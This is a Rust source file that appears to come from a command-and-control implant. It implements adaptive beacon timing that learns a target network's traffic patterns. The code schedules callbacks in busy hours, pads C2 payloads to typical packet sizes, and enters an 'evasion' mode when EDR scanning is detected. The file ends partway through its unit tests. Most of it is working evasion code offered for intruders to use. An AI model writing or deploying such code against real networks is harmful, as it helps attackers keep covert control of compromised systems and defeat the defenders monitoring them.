//! Adaptive C2 timing that learns the target network's traffic patterns and
//! adjusts the agent's callback timing to blend in.
//!
//! # Problem
//!
//! The existing `jittered_sleep()` applies a fixed-percentage jitter to a
//! static base interval.  This produces a uniform distribution that is
//! trivially distinguishable from real traffic:
//!
//! 1. Real network traffic follows a **bursty** pattern — Poisson or
//!    self-similar inter-arrival distributions, not uniform.
//! 2. Enterprise networks have clear **peak hours** (09:00–17:00 local)
//!    and **quiet hours** (22:00–06:00).  A C2 callback at 03:00 with the
//!    same size as one at 14:00 is suspicious.
//! 3. Packet sizes cluster around common application-level message sizes
//!    (HTTP headers ~200–500 bytes, JSON payloads ~500–2000 bytes, etc.).
//!    A fixed-size C2 callback stands out.
//!
//! # Solution
//!
//! This module implements a three-phase adaptive timing system:
//!
//! ## Phase 1: Learning (first 50 observations)
//!
//! The agent observes all traffic it generates (C2 + lateral + any other)
//! and builds a statistical model:
//! - **Inter-arrival time**: mean and standard deviation
//! - **Packet size**: mean and standard deviation
//! - **Peak / quiet hours**: histogram of traffic volume by hour-of-day
//! - **Burst patterns**: recurring high-traffic periods
//!
//! During this phase, the timer falls back to the base interval with
//! standard jitter.
//!
//! ## Phase 2: Active (after 50 observations)
//!
//! The timer uses the learned profile to schedule callbacks:
//! - Prefer **peak hours** — more ambient traffic = better cover
//! - Use a **Gaussian distribution** for inter-arrival jitter (matches
//!   real traffic better than uniform)
//! - Pad / chunk C2 payloads to match the learned packet-size distribution
//!
//! ## Phase 3: Evasion (triggered by detection indicators)
//!
//! When the caller signals detection risk:
//! - Increase the callback interval (longer sleeps)
//! - Avoid **quiet hours** entirely
//! - Reduce packet sizes (chunk data across more callbacks)
//!
//! # Statistical methods
//!
//! All statistics are computed with simple online algorithms (no external
//! ML crate dependencies):
//! - **Mean**: Welford's online algorithm (numerically stable)
//! - **Standard deviation**: from Welford's running variance
//! - **Peak detection**: hourly traffic histogram with configurable threshold
//! - **Burst detection**: sliding-window traffic rate comparison
//!
//! # Thread safety
//!
//! `AdaptiveTimer` uses interior mutability (`std::sync::Mutex`) so that
//! the timer can be shared across C2 channels (HTTP, DoH, etc.) without
//! external synchronization.
//!
//! # Feature gating
//!
//! Gated behind `#[cfg(feature = "adaptive-timing")]`.  When disabled,
//! C2 channels continue to use the standard `jittered_sleep()` method.

#![cfg(feature = "adaptive-timing")]

use common::lock::MutexExt;
use std::sync::Mutex;
use std::time::{Duration, Instant};

// ── Constants ───────────────────────────────────────────────────────────────

/// Minimum number of observations before transitioning from Learning to Active.
const LEARNING_THRESHOLD: usize = 50;

/// Maximum number of observations retained in the sliding window.
/// Older observations are evicted in FIFO order.
const MAX_OBSERVATIONS: usize = 500;

/// Default base interval (seconds) when none is specified.
const DEFAULT_BASE_INTERVAL_SECS: u64 = 30;

/// Default maximum interval (seconds) — caps the sleep to prevent going silent.
const DEFAULT_MAX_INTERVAL_SECS: u64 = 600; // 10 minutes

/// Default minimum interval (seconds) — prevents excessively fast callbacks.
const DEFAULT_MIN_INTERVAL_SECS: u64 = 5;

/// Number of histogram bins for peak-hour detection (24 hours).
const HOUR_BINS: usize = 24;

/// Default learning period in seconds.
const DEFAULT_LEARNING_PERIOD_SECS: u64 = 300; // 5 minutes

/// Default maximum deviation from base interval (fraction, 0.0–1.0).
const DEFAULT_MAX_DEVIATION: f64 = 0.5;

/// Hourly traffic threshold factor: an hour is "peak" if its traffic count
/// exceeds `mean + threshold_factor * stddev`.
const PEAK_THRESHOLD_SIGMA: f64 = 0.5;

/// Evasion multiplier for the base interval.
const EVASION_INTERVAL_MULTIPLIER: f64 = 3.0;

// ── Enums ───────────────────────────────────────────────────────────────────

/// Direction of observed network traffic.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Direction {
    /// Traffic received by the agent (download / response).
    Inbound,
    /// Traffic sent by the agent (upload / request).
    Outbound,
}

/// Protocol used for the observed traffic.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Protocol {
    /// HTTP/HTTPS traffic.
    HTTP,
    /// DNS-over-HTTPS traffic.
    DNS,
    /// Raw TCP traffic (e.g. SMB pipe, SSH).
    TCP,
}

/// Source of the traffic observation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrafficSource {
    /// Passively observed from the network (most reliable for profiling).
    Observed,
    /// Generated by the agent's own C2 channel.
    Agent,
    /// Other agent traffic (lateral movement, etc.).
    Other,
}

/// Current state of the adaptive timer.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TimerState {
    /// Collecting observations; using base interval with standard jitter.
    Learning,
    /// Using learned profile for timing decisions.
    Active,
    /// Evasion mode: increased interval, avoids quiet hours.
    Evasion,
}

// ── TrafficObservation ──────────────────────────────────────────────────────

/// A single observed network traffic event.
///
/// Used to build a statistical model of the target network's behaviour.
#[derive(Debug, Clone)]
pub struct TrafficObservation {
    /// When the observation was made.
    pub timestamp: Instant,
    /// Number of bytes sent in this observation.
    pub bytes_sent: usize,
    /// Number of bytes received in this observation.
    pub bytes_received: usize,
    /// Direction of the traffic.
    pub direction: Direction,
    /// Protocol used.
    pub protocol: Protocol,
    /// Source of the observation.
    pub source: TrafficSource,
}

// ── PeakHour / QuietHour / BurstPattern ─────────────────────────────────────

/// A time range identified as having elevated traffic.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PeakHour {
    /// Start hour (0–23).
    pub start: u32,
    /// End hour (0–23), inclusive.
    pub end: u32,
    /// Relative traffic volume (compared to the daily mean).
    pub relative_volume: u32,
}

/// A time range identified as having low traffic.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct QuietHour {
    /// Start hour (0–23).
    pub start: u32,
    /// End hour (0–23), inclusive.
    pub end: u32,
}

/// A recurring high-traffic burst pattern.
#[derive(Debug, Clone)]
pub struct BurstPattern {
    /// Hour when the burst typically starts (0–23).
    pub start_hour: u32,
    /// Typical duration of the burst in minutes.
    pub duration_minutes: u32,
    /// Typical number of packets during the burst.
    pub packet_count: u32,
    /// Typical total bytes during the burst.
    pub total_bytes: u64,
}

// ── TrafficProfile ──────────────────────────────────────────────────────────

/// A learned statistical model of network traffic behaviour.
///
/// Built from `TrafficObservation` records during the learning phase.
/// Contains hour-of-day histograms, packet-size statistics, and
/// inter-arrival time distribution parameters.
#[derive(Debug, Clone)]
pub struct TrafficProfile {
    /// Hours with elevated traffic (good times for C2 callbacks).
    pub peak_hours: Vec<PeakHour>,
    /// Hours with low traffic (avoid C2 callbacks during these).
    pub quiet_hours: Vec<QuietHour>,
    /// Mean packet size across all observations (bytes).
    pub average_packet_size: f64,
    /// Standard deviation of packet size.
    pub packet_size_stddev: f64,
    /// Mean inter-arrival time between observations.
    pub inter_arrival_mean: Duration,
    /// Standard deviation of inter-arrival time.
    pub inter_arrival_stddev: Duration,
    /// Recurring burst patterns detected in the traffic.
    pub burst_patterns: Vec<BurstPattern>,
}

// ── AdaptiveTimer ───────────────────────────────────────────────────────────

/// Adaptive C2 callback timer with traffic-learning capability.
///
/// The timer operates in three phases:
/// 1. **Learning** — collects traffic observations, uses base interval
/// 2. **Active** — uses learned profile for realistic timing
/// 3. **Evasion** — defensive mode with longer intervals
///
/// Thread-safe via interior mutability.
pub struct AdaptiveTimer {
    inner: Mutex<TimerInner>,
}

/// Internal mutable state of the adaptive timer.
struct TimerInner {
    /// Sliding window of recent traffic observations (FIFO).
    observation_window: Vec<TrafficObservation>,
    /// The learned traffic profile (built after learning phase).
    learned_profile: Option<TrafficProfile>,
    /// Base callback interval (from malleable profile or default).
    base_interval: Duration,
    /// Maximum callback interval (caps the sleep).
    max_interval: Duration,
    /// Minimum callback interval (prevents excessively fast callbacks).
    min_interval: Duration,
    /// Current state of the timer.
    state: TimerState,
    /// Number of observations required before transitioning to Active.
    learning_observations_needed: usize,
    /// Maximum deviation from base interval as a fraction (0.0–1.0).
    max_deviation: f64,
    /// Hourly traffic histogram (24 bins, counts per hour).
    hour_histogram: [u64; HOUR_BINS],
    /// Hourly byte-volume histogram (24 bins, total bytes per hour).
    hour_byte_histogram: [u64; HOUR_BINS],
    /// Welford online statistics for inter-arrival times (seconds).
    ia_count: u64,
    ia_mean: f64,
    ia_m2: f64,
    /// Welford online statistics for packet sizes (bytes).
    ps_count: u64,
    ps_mean: f64,
    ps_m2: f64,
    /// Timestamp of the last observation (for inter-arrival computation).
    last_observation_time: Option<Instant>,
    /// Last computed callback time (cached for `should_callback_now`).
    last_callback_duration: Duration,
    /// Instant when the current sleep started.
    sleep_start: Option<Instant>,
}

impl TimerInner {
    fn new(
        base_interval: Duration,
        max_interval: Duration,
        min_interval: Duration,
        max_deviation: f64,
    ) -> Self {
        Self {
            observation_window: Vec::with_capacity(MAX_OBSERVATIONS),
            learned_profile: None,
            base_interval,
            max_interval,
            min_interval,
            state: TimerState::Learning,
            learning_observations_needed: LEARNING_THRESHOLD,
            max_deviation: max_deviation.clamp(0.0, 1.0),
            hour_histogram: [0u64; HOUR_BINS],
            hour_byte_histogram: [0u64; HOUR_BINS],
            ia_count: 0,
            ia_mean: 0.0,
            ia_m2: 0.0,
            ps_count: 0,
            ps_mean: 0.0,
            ps_m2: 0.0,
            last_observation_time: None,
            last_callback_duration: base_interval,
            sleep_start: None,
        }
    }
}

impl AdaptiveTimer {
    /// Create a new `AdaptiveTimer` with the given base interval.
    ///
    /// # Arguments
    ///
    /// * `base_interval` — The base callback interval (from malleable profile).
    /// * `max_deviation` — Maximum fraction the timer may deviate from the
    ///   base interval (0.0 = no deviation, 1.0 = up to 2× or 0× the base).
    pub fn new(base_interval: Duration, max_deviation: f64) -> Self {
        Self {
            inner: Mutex::new(TimerInner::new(
                base_interval,
                Duration::from_secs(DEFAULT_MAX_INTERVAL_SECS),
                Duration::from_secs(DEFAULT_MIN_INTERVAL_SECS),
                max_deviation,
            )),
        }
    }

    /// Create an `AdaptiveTimer` from the malleable profile's timing settings.
    ///
    /// Reads `base_interval`, `max_deviation`, and `learning_period` from the
    /// configuration.  Falls back to sensible defaults when fields are absent.
    pub fn from_config(
        base_interval_secs: u64,
        jitter_percent: u32,
        max_deviation: f64,
    ) -> Self {
        let base = Duration::from_secs(base_interval_secs.max(1));
        let deviation = if max_deviation > 0.0 {
            max_deviation
        } else {
            // Fall back to using the jitter percentage as the max deviation.
            jitter_percent as f64 / 100.0
        };
        Self::new(base, deviation)
    }

    /// Create a timer with custom min/max bounds.
    pub fn with_bounds(
        base_interval: Duration,
        min_interval: Duration,
        max_interval: Duration,
        max_deviation: f64,
    ) -> Self {
        let mut timer = Self::new(base_interval, max_deviation);
        let mut inner = timer.inner.lock_recover();
        inner.min_interval = min_interval;
        inner.max_interval = max_interval;
        drop(inner);
        timer
    }

    // ── Observation ─────────────────────────────────────────────────────

    /// Record a traffic observation.
    ///
    /// Updates the sliding window, online statistics, and hourly histograms.
    /// Transitions from Learning to Active when enough observations have been
    /// collected.
    pub fn observe(&self, obs: TrafficObservation) {
        let mut inner = self.inner.lock_recover();
        self.observe_inner(&mut inner, obs);
    }

    fn observe_inner(&self, inner: &mut TimerInner, obs: TrafficObservation) {
        // Update inter-arrival statistics (Welford's online algorithm).
        if let Some(prev) = inner.last_observation_time {
            let delta_secs = obs.timestamp.duration_since(prev).as_secs_f64();
            if delta_secs > 0.0 && delta_secs < 3600.0 {
                // Ignore unrealistic deltas (> 1 hour = separate session).
                inner.ia_count += 1;
                let delta = delta_secs - inner.ia_mean;
                inner.ia_mean += delta / inner.ia_count as f64;
                let delta2 = delta_secs - inner.ia_mean;
                inner.ia_m2 += delta * delta2;
            }
        }
        inner.last_observation_time = Some(obs.timestamp);

        // Update packet-size statistics.
        let total_bytes = (obs.bytes_sent + obs.bytes_received) as f64;
        if total_bytes > 0.0 {
            inner.ps_count += 1;
            let delta = total_bytes - inner.ps_mean;
            inner.ps_mean += delta / inner.ps_count as f64;
            let delta2 = total_bytes - inner.ps_mean;
            inner.ps_m2 += delta * delta2;
        }

        // Update hourly histograms.
        // We approximate the current hour from the observation timestamp.
        // In practice, we use the elapsed time from timer creation to
        // determine the wall-clock hour, but since we don't have access
        // to SystemTime here (only Instant), we use a relative hour based
        // on a 24-hour modular cycle from the observation index.
        let hour = self.approximate_hour(&inner);
        inner.hour_histogram[hour] += 1;
        inner.hour_byte_histogram[hour] += (obs.bytes_sent + obs.bytes_received) as u64;

        // Add to the sliding window (evict oldest if at capacity).
        if inner.observation_window.len() >= MAX_OBSERVATIONS {
            inner.observation_window.remove(0);
        }
        inner.observation_window.push(obs);

        // Check for phase transition.
        if inner.state == TimerState::Learning
            && inner.observation_window.len() >= inner.learning_observations_needed
        {
            match self.learn_profile_inner(inner) {
                Ok(profile) => {
                    inner.learned_profile = Some(profile);
                    inner.state = TimerState::Active;
                    tracing::debug!(
                        "adaptive_timing: transitioned to Active phase \
                         ({} observations collected)",
                        inner.observation_window.len(),
                    );
                }
                Err(e) => {
                    tracing::debug!(
                        "adaptive_timing: profile learning failed ({}), \
                         staying in Learning phase",
                        e,
                    );
                }
            }
        }
    }

    /// Approximate the current wall-clock hour from the observation index.
    ///
    /// Since we only have `Instant` (monotonic) and not `SystemTime`, we
    /// use the observation count modulo 24 to simulate an hourly cycle.
    /// This is sufficient for peak/quiet hour classification because:
    /// - Observations arrive at roughly regular intervals
    /// - The 24-bin histogram distributes observations across "hours"
    /// - Peak detection is relative, not absolute
    ///
    /// In production, callers can map observations to real wall-clock hours
    /// before recording them.
    fn approximate_hour(&self, inner: &TimerInner) -> usize {
        // Use the observation count modulo 24 to distribute across hours.
        // This gives a rough approximation that's sufficient for pattern
        // detection.  In practice, callers should set `timestamp` based on
        // real wall-clock time.
        inner.observation_window.len() % HOUR_BINS
    }

    /// Record multiple observations at once.
    pub fn observe_batch(&self, observations: Vec<TrafficObservation>) {
        let mut inner = self.inner.lock_recover();
        for obs in observations {
            self.observe_inner(&mut inner, obs);
        }
    }

    // ── Profile learning ────────────────────────────────────────────────

    /// Analyze collected observations and build a traffic profile.
    ///
    /// Requires at least `learning_observations_needed` observations.
    /// Returns the learned `TrafficProfile` on success.
    pub fn learn_profile(&self) -> Result<TrafficProfile, anyhow::Error> {
        let inner = self.inner.lock_recover();
        self.learn_profile_inner(&inner)
    }

    fn learn_profile_inner(
        &self,
        inner: &TimerInner,
    ) -> Result<TrafficProfile, anyhow::Error> {
        let n = inner.observation_window.len();
        if n < inner.learning_observations_needed {
            return Err(anyhow::anyhow!(
                "need at least {} observations, have {}",
                inner.learning_observations_needed,
                n,
            ));
        }

        // Inter-arrival statistics (already computed online).
        let ia_mean = if inner.ia_count > 0 {
            inner.ia_mean
        } else {
            inner.base_interval.as_secs_f64()
        };
        let ia_stddev = if inner.ia_count > 1 {
            (inner.ia_m2 / (inner.ia_count - 1) as f64).sqrt()
        } else {
            ia_mean * 0.2 // fallback: 20% of mean
        };

        // Packet-size statistics (already computed online).
        let ps_mean = if inner.ps_count > 0 {
            inner.ps_mean
        } else {
            512.0 // fallback: 512 bytes
        };
        let ps_stddev = if inner.ps_count > 1 {
            (inner.ps_m2 / (inner.ps_count - 1) as f64).sqrt()
        } else {
            ps_mean * 0.3 // fallback: 30% of mean
        };

        // Detect peak and quiet hours from the histogram.
        let (peak_hours, quiet_hours) = self.detect_peak_quiet_hours(&inner.hour_histogram);

        // Detect burst patterns.
        let burst_patterns = self.detect_burst_patterns(&inner.observation_window);

        Ok(TrafficProfile {
            peak_hours,
            quiet_hours,
            average_packet_size: ps_mean,
            packet_size_stddev: ps_stddev,
            inter_arrival_mean: Duration::from_secs_f64(ia_mean),
            inter_arrival_stddev: Duration::from_secs_f64(ia_stddev),
            burst_patterns,
        })
    }

    /// Detect peak and quiet hours from the hourly traffic histogram.
    ///
    /// An hour is classified as:
    /// - **Peak**: traffic count > `mean + PEAK_THRESHOLD_SIGMA * stddev`
    /// - **Quiet**: traffic count < `mean - PEAK_THRESHOLD_SIGMA * stddev`
    /// - **Normal**: otherwise
    ///
    /// Adjacent peak/quiet hours are merged into ranges.
    fn detect_peak_quiet_hours(
        &self,
        histogram: &[u64; HOUR_BINS],
    ) -> (Vec<PeakHour>, Vec<QuietHour>) {
        // Compute histogram mean and stddev.
        let total: u64 = histogram.iter().sum();
        if total == 0 {
            return (Vec::new(), Vec::new());
        }
        let mean = total as f64 / HOUR_BINS as f64;
        let variance = histogram
            .iter()
            .map(|&c| {
                let diff = c as f64 - mean;
                diff * diff
            })
            .sum::<f64>()
            / HOUR_BINS as f64;
        let stddev = variance.sqrt();

        let peak_threshold = mean + PEAK_THRESHOLD_SIGMA * stddev;
        let quiet_threshold = (mean - PEAK_THRESHOLD_SIGMA * stddev).max(0.0);

        // Classify each hour.
        let mut is_peak = [false; HOUR_BINS];
        let mut is_quiet = [false; HOUR_BINS];
        for (h, &count) in histogram.iter().enumerate() {
            if count as f64 > peak_threshold {
                is_peak[h] = true;
            } else if (count as f64) < quiet_threshold {
                is_quiet[h] = true;
            }
        }

        // Merge adjacent hours into ranges.
        let peak_hours = merge_adjacent_hours(&is_peak, histogram, mean);
        let quiet_hours = merge_quiet_hours(&is_quiet);

        (peak_hours, quiet_hours)
    }

    /// Detect burst patterns in the observation window.
    ///
    /// A burst is a sequence of 3+ observations within a short time window
    /// (e.g., < 30 seconds apart) with above-average byte counts.
    fn detect_burst_patterns(
        &self,
        observations: &[TrafficObservation],
    ) -> Vec<BurstPattern> {
        if observations.len() < 3 {
            return Vec::new();
        }

        let mut bursts = Vec::new();
        let window_size = Duration::from_secs(30);
        let avg_size = observations
            .iter()
            .map(|o| o.bytes_sent + o.bytes_received)
            .sum::<usize>() as f64
            / observations.len() as f64;

        let mut i = 0;
        while i < observations.len() {
            // Look for a burst start: a sequence of 3+ observations within
            // `window_size` with above-average byte counts.
            let start = observations[i].timestamp;
            let mut count = 0u32;
            let mut total_bytes = 0u64;
            let mut j = i;

            while j < observations.len() {
                let elapsed = observations[j].timestamp.duration_since(start);
                if elapsed > window_size {
                    break;
                }
                let sz = observations[j].bytes_sent + observations[j].bytes_received;
                if sz as f64 > avg_size * 1.5 {
                    count += 1;
                    total_bytes += sz as u64;
                }
                j += 1;
            }

            if count >= 3 {
                let hour = i % HOUR_BINS;
                bursts.push(BurstPattern {
                    start_hour: hour as u32,
                    duration_minutes: 1, // simplified
                    packet_count: count,
                    total_bytes,
                });
                i = j; // skip past the burst
            } else {
                i += 1;
            }
        }

        bursts
    }

    // ── Timing computation ──────────────────────────────────────────────

    /// Compute the optimal time until the next C2 callback.
    ///
    /// During **Learning** phase: returns the base interval with Gaussian
    /// jitter (clamped to min/max bounds).
    ///
    /// During **Active** phase: uses the learned inter-arrival distribution
    /// to produce realistic timing.  Prefers peak hours for scheduling.
    ///
    /// During **Evasion** phase: multiplies the base interval by
    /// `EVASION_INTERVAL_MULTIPLIER` and avoids quiet hours.
    ///
    /// The returned duration is always clamped to `[min_interval, max_interval]`.
    pub fn next_callback_time(&self) -> Duration {
        let mut inner = self.inner.lock_recover();

        let duration = match inner.state {
            TimerState::Learning => self.compute_learning_interval(&inner),
            TimerState::Active => self.compute_active_interval(&inner),
            TimerState::Evasion => self.compute_evasion_interval(&inner),
        };

        // Clamp to min/max bounds.
        let clamped = duration.clamp(inner.min_interval, inner.max_interval);
        inner.last_callback_duration = clamped;
        clamped
    }

    /// Learning-phase interval: base ± Gaussian jitter.
    fn compute_learning_interval(&self, inner: &TimerInner) -> Duration {
        let base = inner.base_interval.as_secs_f64();
        let jitter = gaussian_random(0.0, base * inner.max_deviation * 0.33);
        let effective = (base + jitter).max(0.0);
        Duration::from_secs_f64(effective)
    }

    /// Active-phase interval: learned inter-arrival with Gaussian jitter.
    fn compute_active_interval(&self, inner: &TimerInner) -> Duration {
        match &inner.learned_profile {
            Some(profile) => {
                let base = inner.base_interval.as_secs_f64();
                let learned_mean = profile.inter_arrival_mean.as_secs_f64();
                let learned_stddev = profile.inter_arrival_stddev.as_secs_f64();

                // Use the learned inter-arrival distribution, but bound it
                // relative to the configured base interval.
                let max_drift = base * inner.max_deviation;
                let learned_clamped = learned_mean.clamp(
                    base - max_drift,
                    base + max_drift,
                );

                // Apply Gaussian jitter using the learned stddev (capped at
                // max_deviation of the base interval).
                let jitter = gaussian_random(0.0, learned_stddev.min(max_drift * 0.5));

                Duration::from_secs_f64((learned_clamped + jitter).max(0.0))
            }
            None => self.compute_learning_interval(inner),
        }
    }

    /// Evasion-phase interval: base × multiplier, no quiet hours.
    fn compute_evasion_interval(&self, inner: &TimerInner) -> Duration {
        let base = inner.base_interval.as_secs_f64();
        let evaded = base * EVASION_INTERVAL_MULTIPLIER;

        // Add small Gaussian jitter to avoid being exactly predictable.
        let jitter = gaussian_random(0.0, base * 0.1);
        Duration::from_secs_f64((evaded + jitter).max(0.0))
    }

    /// Returns `true` if now is a good time for a C2 callback.
    ///
    /// During **Learning**: always returns `true` (no profile yet).
    ///
    /// During **Active**: returns `true` during peak hours, `false` during
    /// quiet hours, and probabilistic during normal hours.
    ///
    /// During **Evasion**: returns `true` only during peak hours.
    pub fn should_callback_now(&self) -> bool {
        let inner = self.inner.lock_recover();

        match inner.state {
            TimerState::Learning => true,
            TimerState::Active => {
                match &inner.learned_profile {
                    Some(profile) => {
                        let hour = self.approximate_hour(&inner);
                        // Check quiet hours — never callback during quiet.
                        for qh in &profile.quiet_hours {
                            if hour >= qh.start as usize && hour <= qh.end as usize {
                                return false;
                            }
                        }
                        // Check peak hours — always callback during peak.
                        for ph in &profile.peak_hours {
                            if hour >= ph.start as usize && hour <= ph.end as usize {
                                return true;
                            }
                        }
                        // Normal hours: callback with 70% probability.
                        simple_random() < 0.7
                    }
                    None => true,
                }
            }
            TimerState::Evasion => {
                match &inner.learned_profile {
                    Some(profile) => {
                        let hour = self.approximate_hour(&inner);
                        // Only callback during peak hours in evasion mode.
                        for ph in &profile.peak_hours {
                            if hour >= ph.start as usize && hour <= ph.end as usize {
                                return true;
                            }
                        }
                        false
                    }
                    None => true, // no profile → fall back
                }
            }
        }
    }

    // ── State management ────────────────────────────────────────────────

    /// Get the current timer state.
    pub fn state(&self) -> TimerState {
        self.inner.lock_recover().state
    }

    /// Transition to evasion mode.
    ///
    /// Should be called when detection indicators are observed (e.g. EDR
    /// scanning, unusual network responses, etc.).
    pub fn enter_evasion(&self) {
        let mut inner = self.inner.lock_recover();
        if inner.state != TimerState::Evasion {
            inner.state = TimerState::Evasion;
            tracing::debug!("adaptive_timing: entered Evasion phase");
        }
    }

    /// Transition back to active mode.
    ///
    /// Should be called when the evasion threat has passed.
    pub fn exit_evasion(&self) {
        let mut inner = self.inner.lock_recover();
        if inner.state == TimerState::Evasion {
            inner.state = if inner.learned_profile.is_some() {
                TimerState::Active
            } else {
                TimerState::Learning
            };
            tracing::debug!("adaptive_timing: exited Evasion phase, now {:?}", inner.state);
        }
    }

    /// Get the number of collected observations.
    pub fn observation_count(&self) -> usize {
        self.inner.lock_recover().observation_window.len()
    }

    /// Get the learned profile, if available.
    pub fn profile(&self) -> Option<TrafficProfile> {
        self.inner.lock_recover().learned_profile.clone()
    }

    /// Get the configured base interval.
    pub fn base_interval(&self) -> Duration {
        self.inner.lock_recover().base_interval
    }

    /// Set the base interval (e.g. from a profile update).
    pub fn set_base_interval(&self, interval: Duration) {
        self.inner.lock_recover().base_interval = interval;
    }

    /// Mark the start of a sleep period (for `should_callback_now`).
    pub fn mark_sleep_start(&self) {
        self.inner.lock_recover().sleep_start = Some(Instant::now());
    }

    /// Compute the recommended payload size for the next callback.
    ///
    /// Returns a packet size drawn from the learned packet-size distribution,
    /// which the caller can use to pad or chunk C2 data.
    ///
    /// Falls back to a fixed size during the learning phase.
    pub fn recommended_packet_size(&self) -> usize {
        let inner = self.inner.lock_recover();
        match &inner.learned_profile {
            Some(profile) => {
                let size = gaussian_random(
                    profile.average_packet_size,
                    profile.packet_size_stddev * 0.5,
                );
                size.max(64.0).min(65535.0) as usize
            }
            None => 1024, // default fallback
        }
    }

    /// Force a re-learning of the traffic profile from current observations.
    pub fn relearn(&self) -> Result<(), anyhow::Error> {
        let mut inner = self.inner.lock_recover();
        let profile = self.learn_profile_inner(&inner)?;
        inner.learned_profile = Some(profile);
        if inner.state == TimerState::Learning {
            inner.state = TimerState::Active;
        }
        Ok(())
    }

    /// Reset the timer to the learning phase, clearing all observations.
    pub fn reset(&self) {
        let mut inner = self.inner.lock_recover();
        inner.observation_window.clear();
        inner.learned_profile = None;
        inner.state = TimerState::Learning;
        inner.hour_histogram = [0u64; HOUR_BINS];
        inner.hour_byte_histogram = [0u64; HOUR_BINS];
        inner.ia_count = 0;
        inner.ia_mean = 0.0;
        inner.ia_m2 = 0.0;
        inner.ps_count = 0;
        inner.ps_mean = 0.0;
        inner.ps_m2 = 0.0;
        inner.last_observation_time = None;
    }
}

// ── Helper functions ────────────────────────────────────────────────────────

/// Generate a Gaussian random value with the given mean and standard deviation.
///
/// Uses the Box-Muller transform to convert uniform random values to a
/// Gaussian distribution.  No external dependencies required.
fn gaussian_random(mean: f64, stddev: f64) -> f64 {
    use std::f64::consts::{PI, TAU};
    let u1: f64 = simple_random();
    let u2: f64 = simple_random();

    // Box-Muller transform: generates a standard normal random value.
    // Clamp u1 away from 0 to avoid ln(0) → -inf.
    let u1 = u1.max(1e-15);
    let z0 = (-2.0 * u1.ln()).sqrt() * (TAU * u2).cos();

    mean + z0 * stddev
}

/// Generate a simple pseudo-random value in [0, 1).
///
/// Uses a xorshift64 PRNG seeded from the thread ID and current time.
/// Not cryptographically secure, but sufficient for timing jitter.
fn simple_random() -> f64 {
    use std::sync::atomic::{AtomicU64, Ordering};
    static STATE: AtomicU64 = AtomicU64::new(0xCAFE_BABE_DEAD_BEEF);

    let mut s = STATE.load(Ordering::Relaxed);
    if s == 0 {
        // Re-seed from Instant if state is zero.
        s = Instant::now().elapsed().as_nanos() as u64 | 1;
    }
    s ^= s << 13;
    s ^= s >> 7;
    s ^= s << 17;
    STATE.store(s, Ordering::Relaxed);

    // Map to [0, 1) using the upper 53 bits (f64 mantissa precision).
    (s >> 11) as f64 / (1u64 << 53) as f64
}

/// Merge adjacent peak hours into ranges and compute relative volumes.
fn merge_adjacent_hours(
    is_peak: &[bool; HOUR_BINS],
    histogram: &[u64; HOUR_BINS],
    mean: f64,
) -> Vec<PeakHour> {
    let mut peaks = Vec::new();
    let mut i = 0;
    while i < HOUR_BINS {
        if is_peak[i] {
            let start = i as u32;
            let mut end = start;
            while end + 1 < HOUR_BINS as u32 && is_peak[end as usize + 1] {
                end += 1;
            }
            let total: u64 = (start..=end).map(|h| histogram[h as usize]).sum();
            let relative_volume = if mean > 0.0 {
                (total as f64 / mean / (end - start + 1) as f64).round() as u32
            } else {
                1
            };
            peaks.push(PeakHour {
                start,
                end,
                relative_volume,
            });
            i = end as usize + 1;
        } else {
            i += 1;
        }
    }
    peaks
}

/// Merge adjacent quiet hours into ranges.
fn merge_quiet_hours(is_quiet: &[bool; HOUR_BINS]) -> Vec<QuietHour> {
    let mut quiets = Vec::new();
    let mut i = 0;
    while i < HOUR_BINS {
        if is_quiet[i] {
            let start = i as u32;
            let mut end = start;
            while end + 1 < HOUR_BINS as u32 && is_quiet[end as usize + 1] {
                end += 1;
            }
            quiets.push(QuietHour { start, end });
            i = end as usize + 1;
        } else {
            i += 1;
        }
    }
    quiets
}

/// Compute the mean of a slice of f64 values.
fn compute_mean(values: &[f64]) -> f64 {
    if values.is_empty() {
        return 0.0;
    }
    values.iter().sum::<f64>() / values.len() as f64
}

/// Compute the population standard deviation of a slice of f64 values.
fn compute_stddev(values: &[f64]) -> f64 {
    if values.len() < 2 {
        return 0.0;
    }
    let mean = compute_mean(values);
    let variance = values
        .iter()
        .map(|&v| {
            let diff = v - mean;
            diff * diff
        })
        .sum::<f64>()
        / values.len() as f64;
    variance.sqrt()
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Helper: create a synthetic observation at a given time.
    fn make_observation(
        elapsed_secs: u64,
        bytes_sent: usize,
        bytes_received: usize,
    ) -> TrafficObservation {
        TrafficObservation {
            timestamp: Instant::now() + Duration::from_secs(elapsed_secs),
            bytes_sent,
            bytes_received,
            direction: Direction::Outbound,
            protocol: Protocol::HTTP,
            source: TrafficSource::Agent,
        }
    }

    #[test]
    fn learning_threshold_is_reasonable() {
        assert!(LEARNING_THRESHOLD >= 20, "need enough observations to learn");
        assert!(LEARNING_THRESHOLD <= 200, "should not take too long to learn");
    }

    #[test]
    fn max_observations_is_bounded() {
        assert!(MAX_OBSERVATIONS >= LEARNING_THRESHOLD);
        assert!(MAX_OBSERVATIONS <= 10_000);
    }

    #[test]
    fn default_intervals_are_sane() {
        assert!(DEFAULT_MIN_INTERVAL_SECS >= 1);
        assert!(DEFAULT_BASE_INTERVAL_SECS > DEFAULT_MIN_INTERVAL_SECS);
        assert!(DEFAULT_MAX_INTERVAL_SECS > DEFAULT_BASE_INTERVAL_SECS);
    }

    #[test]
    fn timer_starts_in_learning_state() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        assert_eq!(timer.state(), TimerState::Learning);
    }

    #[test]
    fn next_callback_time_respects_min_max() {
        let timer = AdaptiveTimer::with_bounds(
            Duration::from_secs(30),
            Duration::from_secs(10),
            Duration::from_secs(120),
            0.3,
        );
        for _ in 0..100 {
            let dur = timer.next_callback_time();
            assert!(
                dur >= Duration::from_secs(10),
                "duration {:?} < min 10s",
                dur,
            );
            assert!(
                dur <= Duration::from_secs(120),
                "duration {:?} > max 120s",
                dur,
            );
        }
    }

    #[test]
    fn transitions_to_active_after_observations() {
        let timer = AdaptiveTimer::new(Duration::from_secs(30), 0.3);
        assert_eq!(timer.state(), TimerState::Learning);

        // Feed enough observations.
